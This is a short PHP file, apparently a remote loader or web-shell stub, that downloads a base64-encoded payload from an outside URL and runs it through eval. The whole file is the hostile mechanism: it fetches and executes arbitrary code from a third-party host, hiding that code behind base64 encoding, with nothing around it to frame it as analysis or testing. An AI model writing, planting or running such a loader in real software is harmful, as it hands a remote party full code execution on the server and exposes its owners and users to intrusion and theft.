<?php
$pf = "https://securityxd.github.io/priv8/aes";
$puf = file_get_contents($pf); 
eval("?>".(base64_decode($puf)));
?>
